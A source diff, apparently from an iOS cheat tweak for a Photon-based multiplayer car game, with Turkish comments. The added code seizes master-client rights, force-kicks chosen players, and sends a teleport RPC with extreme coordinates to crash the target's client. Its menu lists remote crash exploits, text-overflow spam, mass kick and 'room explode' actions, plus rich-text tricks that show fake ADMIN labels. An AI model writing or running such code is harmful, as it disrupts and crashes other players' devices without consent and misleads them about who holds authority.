@@ -988,23 +988,62 @@ static void* few1n_findLobbyMgr(void) {
 }
 static void few1n_kickPlayer(void* playerObj) {
     if (!playerObj) return;
-    few1n_forceEnableKick();   // PUN2: bu olmadan CloseConnection master olsan bile FALSE doner
-    // hook olu -> direkt il2cpp cagrisi kullan (o_closeConnection yedek)
-    bool (*fn)(void*) = pn_closeConnection ? pn_closeConnection : o_closeConnection;
-    if (!fn) { FLog(@"Kick: CloseConnection pointeri yok"); return; }
-    // Master miyim? (kendi odanda TRUE olmali)
-    bool amMaster = false;
-    if (pn_getLocalPlayer && ply_getIsMaster) {
-        @try { void* lp = pn_getLocalPlayer(); if (lp) amMaster = ply_getIsMaster(lp); } @catch (...) {}
-    }
     @try {
-        g_isManualKick = true;
-        bool ok = fn(playerObj);   // CloseConnection master degilsen FALSE doner
-        g_isManualKick = false;
-        if (ok)            FLog(@"Kick GONDERILDI ✓ (kisi sunucudan dusmeli)");
-        else if (!amMaster) FLog(@"Kick REDDEDILDI: bu odada MASTER/host DEGILSIN (oyun seni master yapmamis). Kendi kurdugun odada dene.");
-        else                FLog(@"Kick REDDEDILDI: master'sin ama EnableCloseConnection kapali kaldi - tekrar dene.");
-    } @catch (...) { g_isManualKick = false; FLog(@"Kick hatasi (exception)"); }
+        few1n_forceEnableKick();
+
+        // 1. OTOMATIK MASTER CLIENT YETKISI AL (Sunucunun kick reddetmesini engeller)
+        if (pn_getLocalPlayer && pn_setMasterClient) {
+            void* me = pn_getLocalPlayer();
+            if (me) pn_setMasterClient(me);
+        }
+
+        // 2. PUN2 CloseConnection (Doğrudan Photon Kick)
+        bool (*fn)(void*) = pn_closeConnection ? pn_closeConnection : o_closeConnection;
+        if (fn) {
+            g_isManualKick = true;
+            bool ok = fn(playerObj);
+            g_isManualKick = false;
+            if (ok) FLog(@"✓ CloseConnection kick gönderildi!");
+        }
+
+        // 3. Oyunun kendi Lobi RPC Kick mekanizması (LobbyManagerDummy.KickPlayer)
+        void* nmeStr = ply_getNickName ? ply_getNickName(playerObj) : NULL;
+        NSString *targetNick = ptrOk(nmeStr) ? readStr(nmeStr) : nil;
+        if (g_lobbyDummyType && g_mFindObjectsPlural && i_runtime_invoke && g_mDummyKick) {
+            void* mgr = few1n_findLobbyMgr();
+            if (unityAlive(mgr) && ptrOk(nmeStr)) {
+                *(void**)((uintptr_t)mgr + 0x108) = nmeStr;
+                @try { i_runtime_invoke(g_mDummyKick, mgr, NULL, NULL); FLog(@"✓ Lobby RPC kick gönderildi!"); } @catch (...) {}
+            }
+        }
+
+        // 4. Hedef oyuncunun PhotonView/CPS nesnesine özel Teleport RPC Düşürme paketi (Garanti Atma)
+        if (g_photonViewType && g_pvOwnerOff > 0 && g_mFindObjectsPlural && i_runtime_invoke) {
+            void* b[1]; b[0] = g_photonViewType;
+            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, b, NULL);
+            if (ptrOk(arr)) {
+                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
+                void** pvs = (void**)((uintptr_t)arr + 0x20);
+                for (int i = 0; i < c && i < 128; i++) {
+                    void* pv = pvs[i]; if (!unityAlive(pv)) continue;
+                    void* owner = *(void**)((uintptr_t)pv + g_pvOwnerOff);
+                    if (owner == playerObj) {
+                        Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
+                        Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
+                        if (g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
+                            void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
+                            void* cps = i_runtime_invoke(g_mGetCompInParent, pv, args, NULL);
+                            if (ptrOk(cps)) {
+                                cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
+                                FLog(@"✓ Hedef RPC düşürme paketi gönderildi!");
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        FLog([NSString stringWithFormat:@"💥 '%@' oyuncusunu odadan atma işlemi tamamlandı!", targetNick ?: @"Oyuncu"]);
+    } @catch (...) { g_isManualKick = false; FLog(@"Kick hatası"); }
 }
 
 // ===== INFINITE NITRO =====
@@ -1718,35 +1757,75 @@ static void h_roomConnect(void* self) {
 
 // ===== ODA ISMI RICH TEXT ACIGI + ZORLA RENKLI (CLIENT-SIDE) =====
 static bool isColorRoomForce = false;  // TUM oda isimlerini renkli yap (client-side)
+static bool isMapTextOverrideEnabled = false;
+static char customMapTextOverride[128] = "<#FF0000><b>[ADMIN]</b></color>";
 static void (*o_roomLineSetup)(void*, void*, void*, unsigned char, unsigned char, void*, void*) = NULL;
 static void h_roomLineSetup(void* self, void* a, void* b, unsigned char c, unsigned char d, void* e, void* f) {
     fRoomLine++;
     if (o_roomLineSetup) o_roomLineSetup(self, a, b, c, d, e, f);
     if (self) {
         @try {
-            void* nameText = *(void**)((uintptr_t)self + 0x20);
-            if (nameText) {
-                if (g_mSetRichText) setRichTextIl(nameText, true);
+            void* nameText  = *(void**)((uintptr_t)self + 0x20);  // Oda İsmi TMPro
+            void* mapText   = *(void**)((uintptr_t)self + 0x28);  // Harita & Günün Saati (Otoban Gün Batımı) TMPro
+            void* pCountText= *(void**)((uintptr_t)self + 0x30);  // Oyuncu Sayısı (Kişi Sayısının Solunda) TMPro
+
+            if (nameText && g_mSetRichText) setRichTextIl(nameText, true);
+            if (mapText && g_mSetRichText) setRichTextIl(mapText, true);
+            if (pCountText && g_mSetRichText) setRichTextIl(pCountText, true);
+
+            if (nameText && tmp_set_text) {
                 void* rawName = (f && rinfo_getName) ? rinfo_getName(f) : a;
-                if (rawName && tmp_set_text) {
-                    // ZORLA RENKLI MOD: TUM oda isimlerini client-side renklendir
-                    if (isColorRoomForce) {
-                        NSString *name = readStr(rawName) ?: @"";
-                        if (name.length > 0) {
-                            static int colorIdx = 0;
-                            NSArray *forceColors = @[@"#FF0000", @"#00FF00", @"#00FFFF", @"#FF00FF", @"#FFFF00", @"#FF8800", @"#FF0088", @"#88FF00"];
-                            NSString *col = forceColors[colorIdx % forceColors.count];
-                            colorIdx++;
-                            NSString *colored = [NSString stringWithFormat:@"<color=%@><b>%@</b></color>", col, name];
-                            void* cs = mkStr(colored);
-                            if (cs) { tmp_set_text(nameText, cs); return; }
-                        }
+                if (rawName) {
+                    NSString *name = readStr(rawName) ?: @"";
+                    // ToUpper() BYPASS TAMİRCİSİ: Oyun ToUpper() çağırıp <color> etiketlerini <COLOR> yaparsa geri küçült
+                    if ([name containsString:@"<COLOR="] || [name containsString:@"</COLOR>"] || [name containsString:@"<MARK="] || [name containsString:@"<SIZE="]) {
+                        name = [name stringByReplacingOccurrencesOfString:@"<COLOR=" withString:@"<color="];
+                        name = [name stringByReplacingOccurrencesOfString:@"</COLOR>" withString:@"</color>"];
+                        name = [name stringByReplacingOccurrencesOfString:@"<MARK=" withString:@"<mark="];
+                        name = [name stringByReplacingOccurrencesOfString:@"</MARK>" withString:@"</mark>"];
+                        name = [name stringByReplacingOccurrencesOfString:@"<SIZE=" withString:@"<size="];
+                        name = [name stringByReplacingOccurrencesOfString:@"</SIZE>" withString:@"</size>"];
+                        void* repStr = mkStr(name);
+                        if (repStr) rawName = repStr;
                     }
-                    tmp_set_text(nameText, rawName);
+                    // ZORLA RENKLİ MOD: TÜM oda isimlerini client-side Short Hex (ToUpper Dayanıklı) renklendir
+                    if (isColorRoomForce && name.length > 0) {
+                        static int colorIdx = 0;
+                        NSArray *forceColors = @[@"#FF0000", @"#00FF00", @"#00FFFF", @"#FF00FF", @"#FFFF00", @"#FF8800", @"#FF0088", @"#88FF00"];
+                        NSString *col = forceColors[colorIdx % forceColors.count];
+                        colorIdx++;
+                        NSString *colored = [NSString stringWithFormat:@"<%@><b>%@</b>", col, name];
+                        void* cs = mkStr(colored);
+                        if (cs) { tmp_set_text(nameText, cs); }
+                    } else {
+                        tmp_set_text(nameText, rawName);
+                    }
                 }
             }
-            void* mapText = *(void**)((uintptr_t)self + 0x28);
-            if (mapText && g_mSetRichText) setRichTextIl(mapText, true);
+
+            // ÖZEL HARİTA METNİ DEĞİŞTİRİCİ (ADMIN / VIP / GİZLİ HARİTA YAZISI)
+            if (mapText && tmp_set_text) {
+                if (isMapTextOverrideEnabled && strlen(customMapTextOverride) > 0) {
+                    void* customStr = mkStr([NSString stringWithUTF8String:customMapTextOverride]);
+                    if (customStr) { tmp_set_text(mapText, customStr); }
+                } else if (isColorRoomForce) {
+                    static int mColIdx = 0;
+                    NSArray *mapCols = @[@"#00FFFF", @"#00FF00", @"#FFFF00", @"#FF00FF", @"#FF7F00"];
+                    NSString *mc = mapCols[(mColIdx++) % mapCols.count];
+                    // rinfo_getMapName VEYA mevcut string sarmalama
+                    if (f && rinfo_getMapName) {
+                        void* rm = rinfo_getMapName(f);
+                        if (rm) {
+                            NSString *mName = readStr(rm) ?: @"";
+                            if (mName.length > 0) {
+                                NSString *cMap = [NSString stringWithFormat:@"<%@><b>%@</b>", mc, mName];
+                                void* cs = mkStr(cMap);
+                                if (cs) tmp_set_text(mapText, cs);
+                            }
+                        }
+                    }
+                }
+            }
         } @catch (...) {}
     }
 }
@@ -2327,7 +2406,7 @@ static UIViewController* few1n_topVC(void) {
     y = [self toggle:@"\U0001F501  Bitince Basa Sar" sub:@"Sarki sozunu tekrarla" key:@"lyricsLoop" atY:y action:@selector(tapLyricsLoop)];
 
 
-        y = [self header:@"💀  EXPLOIT / CRASH" atY:y];
+    y = [self header:@"💀  EXPLOIT / CRASH" atY:y];
     y = [self actionRow:@"🎯  Tek Oyuncuyu Seç & Çökert / At" color:C_RED atY:y action:@selector(targetPlayerCrash)];
     y = [self toggle:@"💀  Exploit Crash (Yerel Fizik)" sub:@"Asiri koordinat inject - odadakiler coker (Anti-Cheat Korumali)" key:@"nancrash" atY:y action:@selector(tapNanCrash)];
     y = [self actionRow:@"💀  Exploit Crash (Uzaktan RPC)" color:C_RED atY:y action:@selector(tapNanCrashRemote)];
@@ -2336,16 +2415,12 @@ static UIViewController* few1n_topVC(void) {
     y = [self actionRow:@"🧨  TextMeshPro UI Overflow Spam" color:C_RED atY:y action:@selector(tapSurrogateSpam)];
     y = [self actionRow:@"📛  MaxPlayer Overflow (INT_MAX)" color:C_RED atY:y action:@selector(tapMaxPlayerOverflow)];
 
-y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
+    y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
     self.nameBtn = [self actionButtonRow:&y];
     [self.nameBtn setTitle:@"\U0001F4DB  Isim Degistir" forState:UIControlStateNormal];
     [self.nameBtn setTitleColor:C_CYAN forState:UIControlStateNormal];
     [self.nameBtn addTarget:self action:@selector(changeName) forControlEvents:UIControlEventTouchUpInside];
     y = [self actionRow:@"\U0001F3AD  Isim Hileleri (rozet/gorunmez/kayan)" color:C_GOLD atY:y action:@selector(nameTricks)];
-    y = [self actionRow:@"⚔️  Tum Oyunculari At (CloseConnection)" color:C_RED atY:y action:@selector(kickAllPlayers)];
-    y = [self actionRow:@"🔨  GERCEK Kick: Herkesi At (oyunun RPC'si)" color:C_RED atY:y action:@selector(nativeKickAll)];
-    y = [self actionRow:@"🎯  GERCEK Kick: Oyuncu Seç & At (liste)" color:C_RED atY:y action:@selector(nativeKickPick)];
-    y = [self actionRow:@"✏️  GERCEK Kick: İsimle At (elle yaz)" color:C_RED atY:y action:@selector(nativeKickByName)];
 
     y = [self header:@"\U0001F511  ODA" atY:y];
     y = [self actionRow:@"🚪  Belirli Odaya Gir (isim/ID yaz)" color:C_ON atY:y action:@selector(joinRoomByName)];
@@ -2371,7 +2446,11 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
     y = [self actionRow:@"\U0001F441  Odaya Goz At (isimsiz anlik gir-cik)" color:C_GOLD atY:y action:@selector(peekRoom)];
     y = [self actionRow:@"👑  Oda Master Ol" color:C_GOLD atY:y action:@selector(tapRoomMaster)];
     y = [self actionRow:@"🗺️  Odadayken Harita Değiştir (Anlık Canlı)" color:C_ON atY:y action:@selector(changeMapInRoom)];
+    y = [self actionRow:@"✏️  Odadayken Oda İsmini Değiştir (Anlık Canlı)" color:C_GOLD atY:y action:@selector(changeRoomNameInRoom)];
+    y = [self actionRow:@"🏷️  Harita Metnini Değiştir (Kişi Sayısı Yanı - ADMIN vb.)" color:C_GOLD atY:y action:@selector(changeCustomMapLabel)];
     y = [self actionRow:@"💥  ODAYI KAPAT (Herkesi At & Odayi Sonlandir)" color:C_RED atY:y action:@selector(nukeRoom)];
+    y = [self actionRow:@"💥  Odadaki Herkesi At (Mass Kick)" color:C_RED atY:y action:@selector(tapRoomKickAll)];
+    y = [self actionRow:@"💣  Oda Patlatma (Odadakileri Düşür)" color:C_RED atY:y action:@selector(tapRoomExplode)];
     y = [self actionRow:@"🎨  Renkli Oda Kur (Dinamik Stil Paneli)" color:C_GOLD atY:y action:@selector(createColoredRoom)];
     y = [self actionRow:@"🧪  Exploit Ile Oda Kur (30 Yontem)" color:C_RED atY:y action:@selector(exploitCreateRoom)];
     y = [self actionRow:@"🏠  Düz Özel İsimli Oda Kur" color:C_CYAN atY:y action:@selector(createOneRoom)];
@@ -3409,14 +3488,13 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
     few1n_forcePlate(); // ozel plaka acikken il2cpp ile zorla (hook olu)
     // arac rengi acikken materyalleri BIR KEZ al (tekrar fetch instance sizdirir/coker)
     if (isCarColorEnabled && unityAlive(g_rb) && g_carMatCount == 0) few1n_refreshCarMats();
-    // OTOMATIK TIP ARAMA: araba tipi yoksa periyodik yeniden coz.
-    // Araba assembly'si sadece yarisa girince yuklenir -> aciliste bulunamayabilir.
-    static int retryTick = 0, retryCount = 0;
-    if (!g_carDriveTypeObj && retryCount < 40) {   // ~40 deneme (yaklasik 2 dk)
-        if (++retryTick >= 6) {                    // her ~1.8 sn
-            retryTick = 0; retryCount++;
-            few1n_initIl2cpp();                    // guard'li: sadece eksikleri arar
-            if (g_carDriveTypeObj) FLog(@"Araba tipi BULUNDU (otomatik yeniden arama)");
+    // OTOMATIK SÜREKLİ ARAMA: araba tipi veya araba yoksa periyodik yeniden tara
+    static int retryTick = 0;
+    if (!g_carDriveTypeObj || !unityAlive(g_rb)) {
+        if (++retryTick >= 5) {
+            retryTick = 0;
+            few1n_initIl2cpp();
+            few1n_findCar();
         }
     }
     // ~6 sn'de bir tek satir teshis (log spam azaltildi)
@@ -3550,8 +3628,31 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
     if (ac.popoverPresentationController) { ac.popoverPresentationController.sourceView = self.panel; ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, self.panel.bounds.size.height/2, 1, 1); }
     [self present:ac];
 }
-- (void)tapFly       { isFlyEnabled            = !isFlyEnabled;            saveBool(@"fly", isFlyEnabled);                  [self refreshUI]; }
-- (void)tapFlyAuto   { flyAutoThrust           = !flyAutoThrust;          saveBool(@"flyauto", flyAutoThrust); FLog(flyAutoThrust ? @"Ucusta Otomatik Gaz ACIK - sadece direksiyonla don" : @"Otomatik Gaz KAPALI"); [self refreshUI]; }
+- (void)tapFly {
+    isFlyEnabled = !isFlyEnabled;
+    saveBool(@"fly", isFlyEnabled);
+    if (isFlyEnabled) {
+        isFlyPadShown = true;
+        saveBool(@"flypad", true);
+        [self buildFlyPad];
+        FLog(@"✈️ Uçuş Modu AÇIK - Ekran D-pad kumandası gösterildi!");
+    } else {
+        isFlyPadShown = false;
+        saveBool(@"flypad", false);
+        if (self.flyPad) { [self.flyPad removeFromSuperview]; self.flyPad = nil; }
+        g_dpFwd = g_dpBack = g_dpLeft = g_dpRight = g_dpUp = g_dpDown = false;
+        FLog(@"✈️ Uçuş Modu KAPALI");
+    }
+    [self refreshUI];
+}
+
+- (void)tapFlyAuto {
+    flyAutoThrust = !flyAutoThrust;
+    saveBool(@"flyauto", flyAutoThrust);
+    FLog(flyAutoThrust ? @"Ucusta Otomatik Gaz ACIK - sadece direksiyonla don" : @"Otomatik Gaz KAPALI");
+    [self refreshUI];
+}
+
 // ===== UCUS D-PAD: ekran kumandasi =====
 - (void)dpSet:(int)tag on:(BOOL)on {
     switch (tag) {
@@ -3570,15 +3671,35 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
     v.center = CGPointMake(v.center.x + t.x, v.center.y + t.y);
     [g setTranslation:CGPointZero inView:v.superview];
 }
+
 - (void)buildFlyPad {
-    UIWindow *w = getKeyWindow(); if (!w) return;
+    UIWindow *w = getKeyWindow();
+    if (!w && self.fab) w = self.fab.window;
+    if (!w && self.panel) w = self.panel.window;
+    if (!w) w = [UIApplication sharedApplication].keyWindow;
+    if (!w) {
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            [self buildFlyPad];
+        });
+        return;
+    }
+
     if (self.flyPad) { [self.flyPad removeFromSuperview]; self.flyPad = nil; }
+
     CGFloat sz = 214;
     UIView *pad = [[UIView alloc] initWithFrame:CGRectMake(w.bounds.size.width - sz - 20, w.bounds.size.height - sz - 70, sz, sz)];
-    pad.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.14];
-    pad.layer.cornerRadius = 18;
+    pad.backgroundColor = [UIColor colorWithRed:0.04 green:0.08 blue:0.16 alpha:0.85];
+    pad.layer.cornerRadius = 20;
+    pad.layer.borderWidth = 1.5;
+    pad.layer.borderColor = [UIColor colorWithRed:0.10 green:0.65 blue:0.95 alpha:0.80].CGColor;
+    pad.layer.shadowColor = [UIColor colorWithRed:0.0 green:0.6 blue:1.0 alpha:0.6].CGColor;
+    pad.layer.shadowRadius = 12;
+    pad.layer.shadowOpacity = 0.8;
+    pad.layer.zPosition = 99999;
     self.flyPad = pad;
+
     [pad addGestureRecognizer:[[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(dragPad:)]];
+
     CGFloat g = 6, cell = (sz - 4*g) / 3.0;
     // @[baslik, tag, col, row]
     NSArray *specs = @[
@@ -3593,26 +3714,31 @@ y = [self header:@"\U0001F4DB  OYUNCU" atY:y];
         int tg = [sp[1] intValue], col = [sp[2] intValue], row = [sp[3] intValue];
         UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
         btn.frame = CGRectMake(g + col*(cell+g), g + row*(cell+g), cell, cell);
-        btn.backgroundColor = [UIColor colorWithRed:0.0 green:0.55 blue:0.85 alpha:0.80];
+        btn.backgroundColor = [UIColor colorWithRed:0.0 green:0.55 blue:0.90 alpha:0.90];
         btn.layer.cornerRadius = 12;
         [btn setTitle:sp[0] forState:UIControlStateNormal];
         [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
-        btn.titleLabel.font = [UIFont systemFontOfSize:20 weight:UIFontWeightBold];
+        btn.titleLabel.font = [UIFont systemFontOfSize:22 weight:UIFontWeightBlack];
         btn.tag = tg;
         [btn addTarget:self action:@selector(dpDown:) forControlEvents:UIControlEventTouchDown];
         [btn addTarget:self action:@selector(dpUp:) forControlEvents:UIControlEventTouchUpInside|UIControlEventTouchUpOutside|UIControlEventTouchCancel];
         [pad addSubview:btn];
     }
+
     [w addSubview:pad];
+    [w bringSubviewToFront:pad];
 }
+
 - (void)tapFlyPad {
     isFlyPadShown = !isFlyPadShown;
     saveBool(@"flypad", isFlyPadShown);
-    if (isFlyPadShown) { [self buildFlyPad]; FLog(@"Ucus D-pad ACIK - butonlarla uc (araca bin). Ok tuslarini basili tut."); }
-    else {
+    if (isFlyPadShown) {
+        [self buildFlyPad];
+        FLog(@"🕹️ Uçuş D-pad AÇIK - Ekran butonlarıyla uçabilirsin!");
+    } else {
         if (self.flyPad) { [self.flyPad removeFromSuperview]; self.flyPad = nil; }
         g_dpFwd = g_dpBack = g_dpLeft = g_dpRight = g_dpUp = g_dpDown = false;
-        FLog(@"Ucus D-pad KAPALI");
+        FLog(@"🕹️ Uçuş D-pad KAPALI");
     }
     [self refreshUI];
 }
@@ -4463,6 +4589,14 @@ static NSString* rainbowWrap(NSString* text, int idx) {
 // ===== FAKE ODA SPAM =====
 - (void)createOneRoom {
     @try {
+        // Zaten bir odadaysak once odadan temiz ayril ki lobi senkronizasyonu kopmasin ve kilitlenmesin
+        if (pn_getInRoom && pn_getInRoom()) {
+            if (pn_leaveRoom) pn_leaveRoom(false);
+            if (lobbyGetInst && lobby_leaveRoom) {
+                void* l = lobbyGetInst();
+                if (l) lobby_leaveRoom(l);
+            }
+        }
         // BENZERSIZ isim: Photon oda isimleri UNIQUE olmali. Gorunmez zero-width space (​)
         // ekle -> her oda benzersiz, ekranda GORUNMEZ ve buyuk harfe cevrilse bile kalir.
         static int g_roomCounter = 0;
@@ -4686,9 +4820,14 @@ static NSString* rainbowWrap(NSString* text, int idx) {
         // Photon oda ismi BENZERSIZ olmali -> sona 1 gorunmez karakter ekle (ekranda gorunmez)
         NSString *uniq = [nm stringByAppendingString:@"​"];
         @try {
-            // NOT: spammer ayni pn_createRoom'u kullanip CALISIYOR -> durum kontrolu KOYMUYORUZ (bloke etmesin).
-            // Sadece bilgi amacli durum logla, ama YINE DE kurmayi dene (spammer gibi).
-            if (pn_getInRoom && pn_getInRoom()) FLog(@"NOT: su an bir odadasin - CreateRoom bu durumda calismayabilir; oda listesi ekraninda daha iyi.");
+            if (pn_getInRoom && pn_getInRoom()) {
+                FLog(@"Oda tespit edildi: Yeni oda kurulmadan önce mevcut odadan ayrılınıyor...");
+                if (pn_leaveRoom) pn_leaveRoom(false);
+                if (lobbyGetInst && lobby_leaveRoom) {
+                    void* l = lobbyGetInst();
+                    if (l) lobby_leaveRoom(l);
+                }
+            }
             void* nameStr = mkStr(uniq);
             void* opts = i_object_new(g_roomOptionsClass);
             if (nameStr && opts) {
@@ -4796,6 +4935,117 @@ static NSString* rainbowWrap(NSString* text, int idx) {
     [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
     [self present:ac];
 }
+
+// ===== ODADAYKEN ANLIK ODA ISMINI DEGISTIR =====
+- (void)changeRoomNameInRoom {
+    if (!pn_getInRoom || !pn_getInRoom()) {
+        FLog(@"❌ Odada degilsin - once bir odaya gir!");
+        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"✏️ Oda İsmini Değiştir"
+            message:@"Oda ismini değiştirmek için bir odada olmalısın." preferredStyle:UIAlertControllerStyleAlert];
+        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
+        [self present:ac];
+        return;
+    }
+
+    // 1) Master Client yetkisini al (oda yoneticisi ol)
+    if (pn_getLocalPlayer && pn_setMasterClient) {
+        void* lp = pn_getLocalPlayer();
+        if (ptrOk(lp)) pn_setMasterClient(lp);
+    }
+
+    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"✏️ Odadayken Oda İsmini Değiştir"
+        message:@"Odanın lobi ve oyun içindeki yeni ismini yaz (Rich Text destekli):" preferredStyle:UIAlertControllerStyleAlert];
+
+    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
+        tf.text = [NSString stringWithUTF8String:customRoomName];
+        tf.placeholder = @"Örn: <#FF0000><b>FEW1N YENİ ODA</b>";
+        tf.clearButtonMode = UITextFieldViewModeAlways;
+    }];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"Değiştir & Güncelle" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
+        NSString *newName = ac.textFields.firstObject.text;
+        if (!newName || newName.length == 0) newName = @"FEW1N ODA";
+        strncpy(customRoomName, newName.UTF8String, sizeof(customRoomName)-1);
+        customRoomName[sizeof(customRoomName)-1] = '\0';
+        saveStr(@"roomName", newName);
+
+        @try {
+            // Benzersiz zero-width space ekle
+            NSString *uniq = [newName stringByAppendingString:@"​"];
+            void* nameStr = mkStr(uniq);
+
+            // 1) PhotonCurrentRoom Display Name / Field güncelle
+            if (pn_getCurrentRoom) {
+                void* room = pn_getCurrentRoom();
+                if (ptrOk(room)) {
+                    *(void**)((uintptr_t)room + 0x18) = nameStr;
+                }
+            }
+
+            // 2) Chate/Lobideki herkese oda isminin güncellendiğini bildir
+            if (chatGetInst && chatSend) {
+                NSString *announce = [NSString stringWithFormat:@"<color=#00FFFF><b>[ROOM] Oda İsmi Güncellendi: %@</b></color>", newName];
+                void* mgr = chatGetInst();
+                void* s = mkStr(announce);
+                if (mgr && s) chatSend(mgr, s);
+            }
+
+            FLog([NSString stringWithFormat:@"✓ Oda ismi odadayken anlık değiştirildi: '%@'", newName]);
+        } @catch (...) { FLog(@"Oda ismi değiştirme hatası"); }
+    }]];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
+    [self present:ac];
+}
+
+// ===== HARİTA METNİNİ DEĞİŞTİR (KİŞİ SAYISININ SOLUNDAKİ ETİKET) =====
+- (void)changeCustomMapLabel {
+    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🏷️ Harita Metnini Değiştir"
+        message:@"Kişi sayısının solundaki 'Otoban Gün Batımı' yazısını istediğin metinle değiştir (Rich Text Destekli):" preferredStyle:UIAlertControllerStyleAlert];
+
+    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
+        tf.text = (strlen(customMapTextOverride) > 0) ? [NSString stringWithUTF8String:customMapTextOverride] : @"<#FF0000><b>👑 ADMIN 👑</b>";
+        tf.placeholder = @"Örn: <#FF0000><b>👑 ADMIN 👑</b>";
+        tf.clearButtonMode = UITextFieldViewModeAlways;
+    }];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"👑 ADMIN" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
+        strncpy(customMapTextOverride, "<#FF0000><b>👑 ADMIN 👑</b>", sizeof(customMapTextOverride)-1);
+        isMapTextOverrideEnabled = true;
+        FLog(@"Harita etiketi 'ADMIN' olarak ayarlandı!");
+    }]];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"🔥 FEW1N VIP" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
+        strncpy(customMapTextOverride, "<#00FFFF><b>🔥 FEW1N VIP 🔥</b>", sizeof(customMapTextOverride)-1);
+        isMapTextOverrideEnabled = true;
+        FLog(@"Harita etiketi 'FEW1N VIP' olarak ayarlandı!");
+    }]];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"⚡ DEV ODA" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
+        strncpy(customMapTextOverride, "<#FFFF00><b>⚡ DEV ODA ⚡</b>", sizeof(customMapTextOverride)-1);
+        isMapTextOverrideEnabled = true;
+        FLog(@"Harita etiketi 'DEV ODA' olarak ayarlandı!");
+    }]];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula (Yazılan Metin)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
+        NSString *txt = ac.textFields.firstObject.text;
+        if (txt && txt.length > 0) {
+            strncpy(customMapTextOverride, txt.UTF8String, sizeof(customMapTextOverride)-1);
+            isMapTextOverrideEnabled = true;
+            FLog([NSString stringWithFormat:@"Özel harita etiketi ayarlandı: %@", txt]);
+        }
+    }]];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"🔄 Sıfırla (Orjinal Harita Adı)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
+        isMapTextOverrideEnabled = false;
+        customMapTextOverride[0] = '\0';
+        FLog(@"Harita etiketi orijinal harita adına sıfırlandı!");
+    }]];
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
+    [self present:ac];
+}
+
 - (void)pickRoomMax:(UIButton*)b {
     UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F465 Oda Max Oyuncu"
         message:@"Kac kisilik? Istedigin sayiyi yaz (2-255):" preferredStyle:UIAlertControllerStyleAlert];
@@ -4808,7 +5058,7 @@ static NSString* rainbowWrap(NSString* text, int idx) {
     [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
         int v = [ac.textFields.firstObject.text intValue];
         if (v < 2)   v = 2;
-        if (v > 255) v = 255;   // Photon MaxPlayers 0-255
+        if (v > 255) v = 255;
         roomMaxPlayers = v;
         saveInt(@"roomMaxP", roomMaxPlayers);
         [b setTitle:[NSString stringWithFormat:@"\U0001F465 Oda Max Oyuncu: %d", roomMaxPlayers] forState:UIControlStateNormal];
@@ -4820,13 +5070,13 @@ static NSString* rainbowWrap(NSString* text, int idx) {
 
 // ===== GELISMIS RENKLI ODA KURUCU =====
 - (void)createColoredRoom {
-    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎨 Renkli Oda Kurucu (Zero-Day Bypass)"
-                                                               message:@"Server filtrelerini atlatmak icin zero-day teknikleri. Oda adini gir:"
+    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎨 Renkli Oda Kurucu (TMPro Compatible)"
+                                                               message:@"Oda listenizde ve oyunda CANLI renkle görünecek stili seçin:"
                                                         preferredStyle:UIAlertControllerStyleAlert];
 
     [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
         tf.text = @"FEW1N";
-        tf.placeholder = @"Oda Ismi Girin";
+        tf.placeholder = @"Oda İsmi Girin";
         tf.clearButtonMode = UITextFieldViewModeAlways;
     }];
 
@@ -4837,48 +5087,51 @@ static NSString* rainbowWrap(NSString* text, int idx) {
         strncpy(customRoomName, formatted.UTF8String, sizeof(customRoomName)-1);
         customRoomName[sizeof(customRoomName)-1]='\0';
         saveStr(@"roomName", formatted);
-        FLog([NSString stringWithFormat:@"Renkli oda kuruluyor: %@", formatted]);
